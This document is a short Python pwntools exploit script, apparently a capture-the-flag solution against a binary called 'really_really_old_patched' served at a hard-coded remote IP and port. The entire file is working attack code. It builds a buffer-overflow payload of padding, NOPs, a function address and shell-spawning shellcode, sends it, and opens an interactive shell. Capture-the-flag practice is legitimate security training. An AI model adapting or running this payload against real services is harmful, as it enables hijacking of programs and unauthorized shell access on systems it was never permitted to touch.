#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./really_really_old_patched")

context.binary = exe

REMOTE_NC_CMD    = " nc 165.227.103.166 6000 "    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b krabby_patty_formula
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = b"A"*48 + b"\x90"*8 + p64(exe.sym.krabby_patty_formula) + asm(shellcraft.sh())

    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()